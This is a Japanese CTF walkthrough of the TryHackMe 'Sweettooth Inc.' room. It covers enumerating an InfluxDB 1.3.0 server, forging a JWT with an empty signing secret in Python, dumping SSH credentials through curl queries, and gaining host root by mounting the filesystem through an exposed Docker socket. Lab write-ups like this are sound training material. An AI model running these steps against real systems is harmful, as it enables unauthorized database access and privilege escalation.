# Sweettooth Inc. CTF

https://tryhackme.com/room/sweettoothinc

## Enumeration

```shell
TARGET=10.10.188.196
sudo bash -c "echo $TARGET   sweettooth.thm >> /etc/hosts"
```

### ポートスキャン

```sh
root@ip-10-10-146-52:~# nmap -sT -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-07-26 00:35 BST
Nmap scan report for sweettooth.thm (10.10.188.196)
Host is up (0.055s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE
111/tcp   open  rpcbind
2222/tcp  open  EtherNetIP-1
8086/tcp  open  d-s-n
33060/tcp open  mysqlx
MAC Address: 02:0B:CB:29:6D:BF (Unknown)
```

```sh
root@ip-10-10-146-52:~# nmap -sV -p111,2222,8086,33060 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-07-26 00:36 BST
Nmap scan report for sweettooth.thm (10.10.188.196)
Host is up (0.00018s latency).

PORT      STATE SERVICE VERSION
111/tcp   open  rpcbind 2-4 (RPC #100000)
2222/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
8086/tcp  open  http    InfluxDB http admin 1.3.0
33060/tcp open  status  1 (RPC #100024)
MAC Address: 02:0B:CB:29:6D:BF (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

InfluxDB 1.3.0

### gobuster

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

root@ip-10-10-146-52:~# gobuster dir -q -x=txt -u http://$TARGET:8086 -w ./dirlist.txt -t 64 -k
/ping                 (Status: 204) [Size: 0]
/query                (Status: 401) [Size: 55]
/status               (Status: 204) [Size: 0]
/write                (Status: 405) [Size: 19]
```

/queryにアクセスすると、認証ダイアログが表示される。

### CVE-2019-20933

`InfluxDB before 1.7.6` で可能性があるので試す。

https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933

```sh
$ python __main__.py
/home/kali/ctf/sweet/InfluxDB-Exploit-CVE-2019-20933/__main__.py:176: SyntaxWarning: invalid escape sequence '\|'
  |_   _|      / _| |          |  __ \|  _ \  |  ____|          | |     (_) |

  _____        __ _            _____  ____    ______            _       _ _                                         
 |_   _|      / _| |          |  __ \|  _ \  |  ____|          | |     (_) |                                        
   | |  _ __ | |_| |_   ___  __ |  | | |_) | | |__  __  ___ __ | | ___  _| |_                                       
   | | | '_ \|  _| | | | \ \/ / |  | |  _ <  |  __| \ \/ / '_ \| |/ _ \| | __|                                      
  _| |_| | | | | | | |_| |>  <| |__| | |_) | | |____ >  <| |_) | | (_) | | |_                                       
 |_____|_| |_|_| |_|\__,_/_/\_\_____/|____/  |______/_/\_\ .__/|_|\___/|_|\__|                                      
                                                         | |                                                        
                                                         |_|                                                        
 - using CVE-2019-20933

Host (default: localhost): sweettooth.thm
Port (default: 8086): 
Username <OR> path to username file (default: users.txt): influxdb
ERROR: Host not vulnerable !!!
ERROR: user not found
```

この脆弱性は有効ではないらしい。

### 0day?

CVE不明だが、バージョン1.3.0でピンポイントな記事がある。

https://www.komodosec.com/post/when-all-else-fails-find-a-0-day?ref=unhackable.lol


```
http://sweettooth.thm:8086/debug/requests
```

でユーザー名が出てくる。

```json
{
"o5yY6yya:127.0.0.1": {"writes":2,"queries":2}
}
```

引き続き、手順に従いJWTを作る。

```
header - {"alg": "HS256", "typ": "JWT"}
payload - {"username":"<input user name here>","exp":1548669066}
signature - HMACSHA256(base64UrlEncode(header) + "." +base64UrlEncode(payload),<leave this field empty>)
```

jwt.io で作れなくなっているのでPythonで作る。  
重要なのは、シークレットの部分を空にすること。

```python
import json
import base64
import hmac
import hashlib

def base64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')

# Step 1: ヘッダーとペイロードを定義
header = {"alg": "HS256", "typ": "JWT"}
payload = {"username": "o5yY6yya", "exp": 1753576878}

# Step 2: エンコード
encoded_header = base64url_encode(json.dumps(header, separators=(',', ':')).encode())
encoded_payload = base64url_encode(json.dumps(payload, separators=(',', ':')).encode())

# Step 3: 署名を作成（空の鍵を使用）
signing_input = f"{encoded_header}.{encoded_payload}"
secret_key = b""  # 空の秘密鍵
signature = hmac.new(secret_key, signing_input.encode(), hashlib.sha256).digest()
encoded_signature = base64url_encode(signature)

# JWTの完成
jwt_token = f"{encoded_header}.{encoded_payload}.{encoded_signature}"
print(jwt_token)
```

## InfluxDB

https://docs.influxdata.com/influxdb/v1/query_language/ で構文を確認。

### show databases

```sh
$ curl -i -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxNzUzNTc2ODc4fQ.JzoCDN4HmVWLINIyylrw4Haz3bSVXtuoqjhdMTSBCok" -G http://sweettooth.thm:8086/query --data-urlencode "q=show databases"
HTTP/1.1 200 OK
Connection: close
Content-Type: application/json
Request-Id: 04c5a8d1-69be-11f0-9526-000000000000
X-Influxdb-Version: 1.3.0
Date: Sat, 26 Jul 2025 01:15:29 GMT
Transfer-Encoding: chunked

{"results":[{"statement_id":0,"series":[{"name":"databases","columns":["name"],"values":[["creds"],["docker"],["tanks"],["mixer"],["_internal"]]}]}]}
```

creds, docker, tanks, mixer, _internal

### tanks

タンクは4種類で、水タンクは4つめ。

```sh
$ curl -i -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxNzUzNTc2ODc4fQ.JzoCDN4HmVWLINIyylrw4Haz3bSVXtuoqjhdMTSBCok" -G "http://sweettooth.thm:8086/query" --data-urlencode "q=show field keys on tanks"
HTTP/1.1 200 OK
Connection: close
Content-Type: application/json
Request-Id: 1fd86ea1-69c1-11f0-9848-000000000000
X-Influxdb-Version: 1.3.0
Date: Sat, 26 Jul 2025 01:37:43 GMT
Transfer-Encoding: chunked

{"results":[{"statement_id":0,"series":[{"name":"fruitjuice_tank","columns":["fieldKey","fieldType"],"values":[["filling_height","float"],["temperature","float"]]},{"name":"gelatin_tank","columns":["fieldKey","fieldType"],"values":[["filling_height","float"],["temperature","float"]]},{"name":"sugar_tank","columns":["fieldKey","fieldType"],"values":[["filling_height","float"],["temperature","float"]]},{"name":"water_tank","columns":["fieldKey","fieldType"],"values":[["filling_height","float"],["temperature","float"]]}]}]}
```

ある時間の水タンクの温度

```sh
$ curl -i -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxNzUzNTc2ODc4fQ.JzoCDN4HmVWLINIyylrw4Haz3bSVXtuoqjhdMTSBCok" -G "http://sweettooth.thm:8086/query?db=tanks" --data-urlencode "q=select * from water_tank"     
HTTP/1.1 200 OK
Connection: close
Content-Type: application/json
Request-Id: d40f6299-69c2-11f0-9a00-000000000000
X-Influxdb-Version: 1.3.0
Date: Sat, 26 Jul 2025 01:49:55 GMT
Transfer-Encoding: chunked

{"results":[{"statement_id":0,"series":[{"name":"water_tank","columns":["time","filling_height","temperature"],"values":[["2021-05-16T12:00:00Z",93.27,22.79],["2021-05-16T13:00:00Z",93.01,21.21],["2021-05-16T14:00:00Z",93.9,22.67],["2021-05-16T15:00:00Z",93.87,23.92],["2021-05-16T16:00:00Z",94.02,23.5],["2021-05-16T17:00:00Z",93.5,23.86],["2021-05-16T18:00:00Z",93.09,23.21],......
```

### mixier

```sh
$ curl -i -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxNzUzNTc2ODc4fQ.JzoCDN4HmVWLINIyylrw4Haz3bSVXtuoqjhdMTSBCok" -G "http://sweettooth.thm:8086/query" --data-urlencode "q=show field keys on mixer"
HTTP/1.1 200 OK
Connection: close
Content-Type: application/json
Request-Id: 28a211e2-69c3-11f0-9a55-000000000000
X-Influxdb-Version: 1.3.0
Date: Sat, 26 Jul 2025 01:52:16 GMT
Transfer-Encoding: chunked

{"results":[{"statement_id":0,"series":[{"name":"mixer_stats","columns":["fieldKey","fieldType"],"values":[["filling_height","float"],["motor_rpm","float"],["temperature","float"]]}]}]}
```

RPMの最大値

```sh
$ curl -i -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxNzUzNTc2ODc4fQ.JzoCDN4HmVWLINIyylrw4Haz3bSVXtuoqjhdMTSBCok" -G "http://sweettooth.thm:8086/query?db=mixer" --data-urlencode "q=select max(motor_rpm) from mixer_stats"
HTTP/1.1 200 OK
Connection: close
Content-Type: application/json
Request-Id: 8407583d-69c3-11f0-9ab3-000000000000
X-Influxdb-Version: 1.3.0
Date: Sat, 26 Jul 2025 01:54:50 GMT
Transfer-Encoding: chunked

{"results":[{"statement_id":0,"series":[{"name":"mixer_stats","columns":["time","max"],"values":[["2021-05-20T15:00:00Z",[REDACTED]]]}]}]}
```

### creds

```sh
$ curl -i -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxNzUzNTc2ODc4fQ.JzoCDN4HmVWLINIyylrw4Haz3bSVXtuoqjhdMTSBCok" -G "http://sweettooth.thm:8086/query" --data-urlencode "q=show field keys on creds"
HTTP/1.1 200 OK
Connection: close
Content-Type: application/json
Request-Id: bec82d39-69c3-11f0-9aed-000000000000
X-Influxdb-Version: 1.3.0
Date: Sat, 26 Jul 2025 01:56:28 GMT
Transfer-Encoding: chunked

{"results":[{"statement_id":0,"series":[{"name":"ssh","columns":["fieldKey","fieldType"],"values":[["pw","float"]]}]}]}
```

```sh
$ curl -i -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxNzUzNTc2ODc4fQ.JzoCDN4HmVWLINIyylrw4Haz3bSVXtuoqjhdMTSBCok" -G "http://sweettooth.thm:8086/query?db=creds" --data-urlencode "q=select * from ssh"      
HTTP/1.1 200 OK
Connection: close
Content-Type: application/json
Request-Id: d3be8828-69c3-11f0-9b03-000000000000
X-Influxdb-Version: 1.3.0
Date: Sat, 26 Jul 2025 01:57:04 GMT
Transfer-Encoding: chunked

{"results":[{"statement_id":0,"series":[{"name":"ssh","columns":["time","pw","user"],"values":[["2021-05-16T12:00:00Z",[REDACTED],"[REDACTED]"]]}]}]}
```

この認証情報でSSH接続できる。

## Dockerエスケープ

psコマンドにより、socat で 8080ポートを dockerソケットに転送していることが分かる。

```sh
socat TCP-LISTEN:8080,reuseaddr,fork UNIX-CLIENT:/var/run/docker.sock
```

SSHトンネリングでkaliから接続できるようにする。

```sh
$ ssh -L 8080:localhost:8080 uzJk6Ry98d8C@10.10.188.196 -p 2222
```

kaliからdockerコマンドを実行可能。

```sh
$ docker -H tcp://localhost:8080 ps
CONTAINER ID   IMAGE                  COMMAND                  CREATED       STATUS       PORTS                                          NAMES
4aec7d97e857   sweettoothinc:latest   "/bin/bash -c 'chmod…"   4 hours ago   Up 4 hours   0.0.0.0:8086->8086/tcp, 0.0.0.0:2222->22/tcp   sweettoothinc

$ docker -H tcp://localhost:8080 images
REPOSITORY      TAG       IMAGE ID       CREATED       SIZE
sweettoothinc   latest    26a697c0d00f   4 years ago   359MB
influxdb        1.3.0     e1b5eda429c3   8 years ago   227MB
```

sweettoothinc を使うと、リクエストログが大量に表示されて操作できなかったので、influxdbを使用してホストOSのルートディレクトリをマウントした。

```sh
$ docker -H tcp://localhost:8080 run -v /:/mnt --rm -it influxdb:1.3.0 chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root)
# 
```

直接ホストOSのrootを取れた。

/root がホストOS、/var 以下がゲストOSの root ディレクトリ。

```sh
# find / -name 'root.txt' -type f 2>/dev/null
/root/root.txt
/var/lib/docker/aufs/mnt/3e5a0c42adeaff1d40c8d6d91fa79cc0b4a6d75577f6bd3fae5dfaeb5e493399/root/root.txt
/var/lib/docker/aufs/mnt/724193f3a96334894c6814b8588207aeb1b96ba5f06bc6aa191e0a5ee4272669/root/root.txt
/var/lib/docker/aufs/diff/20629420626c70a9bdf5807427da0badebc8e5d842cb82ae3ff83822b18c9e2a/root/root.txt
```



## 振り返り

- InfluxDB の脆弱性は、JWTのシークレットをサイト管理者が各自設定しなければならないが、デフォルトではブランクだったということ。バージョン1.3だったら必ず脆弱性があるということではない。
